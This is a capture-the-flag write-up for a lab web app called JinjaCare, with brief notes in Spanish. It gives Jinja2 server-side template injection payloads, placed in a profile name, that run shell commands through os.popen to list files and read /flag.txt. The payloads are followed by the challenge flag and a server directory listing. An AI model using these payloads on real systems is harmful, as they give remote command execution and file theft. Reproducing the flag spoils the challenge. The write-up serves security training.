
# JinjaCare

JinjaCare

Jinjacare is a web application designed to help citizens manage and access their COVID-19 vaccination records. The platform allows users to store their vaccination history and generate digital certificates. They've asked you to hunt for any potential security issues in their application and retrieve the flag stored in their site.  
**📝 Related Bug Bounty Reports**  
**Bug Report #1** - [RCE via SSTI](https://hackerone.com/reports/125980)  
**Bug Report #2** - [SSTI](https://hackerone.com/reports/1104349)

## Solve




- nos registrasmos en al aplicacion
- en el nombre del profile SSTI
- aparece al descargar el certificado

```
{{''.__class__.__mro__[1].__subclasses__()}}

{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}

{{config.__class__.__init__.__globals__['os'].popen('find / -name flag.txt 2>/dev/null').read()}}

{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt 2>/dev/null').read()}}

HTB{v3ry_e4sy_sst1_r1ght?_d5c83bb4be2fcea4e609f7efd41959d6}

```

```
total 68 drwxr-xr-x 1 root root 4096 Jun 28 03:36 . drwxr-xr-x 1 root root 4096 Jun 28 03:36 .. drwxr-xr-x 2 root root 4096 Jun 28 03:36 __pycache__ -rw-r--r-- 1 root root 14899 May 29 04:31 app.py - rw-r--r-- 1 root root 123 May 29 04:31 config.py drwxr-xr-x 1 root root 4096 Jun 28 04:21 data -rw-r--r-- 1 root root 2981 May 29 04:31 database.py -rw-r--r-- 1 root root 97 May 29 04:31 requirements.txt -rwr--r-- 1 root root 450 May 29 04:31 reset_db.py drwxr-xr-x 5 root root 4096 May 29 04:31 static -rw-r--r- - 1 root root 647 Jun 28 03:36 supervisord.log -rw-r--r-- 1 root root 2 Jun 28 03:36 supervisord.pid drwxr-xr-x 5 root root 4096 May 29 04:31 templates

```